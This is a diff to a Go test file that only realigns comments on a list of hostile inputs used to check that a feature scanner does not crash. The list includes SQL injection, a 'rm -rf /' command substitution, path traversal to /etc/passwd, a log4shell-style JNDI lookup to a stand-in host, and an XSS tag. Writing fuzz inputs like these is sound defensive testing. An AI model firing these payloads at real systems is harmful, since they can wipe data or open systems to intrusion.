@@ -36,20 +36,20 @@ import (
 // used as feature names. None of these may crash the deterministic scan path.
 func hostileFeatureInputs() [][]byte {
 	return [][]byte{
-		[]byte("'; DROP TABLE features; --"),               // SQL injection
-		[]byte("$(rm -rf /)"),                               // command substitution
-		[]byte("`reboot`"),                                  // backtick injection
-		[]byte("../../../../etc/passwd"),                    // path traversal
-		[]byte("%00%0a%0d"),                                 // percent-encoded control
-		{0x00, 0x01, 0x02, 0x07, 0x08, 0x1b, 0x7f},          // raw NUL + control bytes
-		[]byte("\n\r\t\v\f"),                                // whitespace control
-		[]byte("${jndi:ldap://evil/x}"),                     // log4shell-style
-		[]byte("<script>alert(1)</script>"),                 // XSS
-		{0xff, 0xfe, 0xfd, 0xc0, 0x80},                      // invalid UTF-8
-		[]byte(strings.Repeat("A", 1<<20)),                  // 1 MiB oversized input
-		[]byte(strings.Repeat("名前", 50000)),                 // large multibyte
+		[]byte("'; DROP TABLE features; --"),          // SQL injection
+		[]byte("$(rm -rf /)"),                         // command substitution
+		[]byte("`reboot`"),                            // backtick injection
+		[]byte("../../../../etc/passwd"),              // path traversal
+		[]byte("%00%0a%0d"),                           // percent-encoded control
+		{0x00, 0x01, 0x02, 0x07, 0x08, 0x1b, 0x7f},    // raw NUL + control bytes
+		[]byte("\n\r\t\v\f"),                          // whitespace control
+		[]byte("${jndi:ldap://evil/x}"),               // log4shell-style
+		[]byte("<script>alert(1)</script>"),           // XSS
+		{0xff, 0xfe, 0xfd, 0xc0, 0x80},                // invalid UTF-8
+		[]byte(strings.Repeat("A", 1<<20)),            // 1 MiB oversized input
+		[]byte(strings.Repeat("名前", 50000)),           // large multibyte
 		[]byte("feature\x00with\x00embedded\x00nuls"), // embedded NULs
-		{},                                            // empty payload
+		{}, // empty payload
 		// Unicode RTL-override (U+202E) prefix attack, byte-constructed so the
 		// source file holds no raw bidi control char (avoids editor/parser bidi
 		// spoofing) while still feeding the real control codepoint to the scanner.
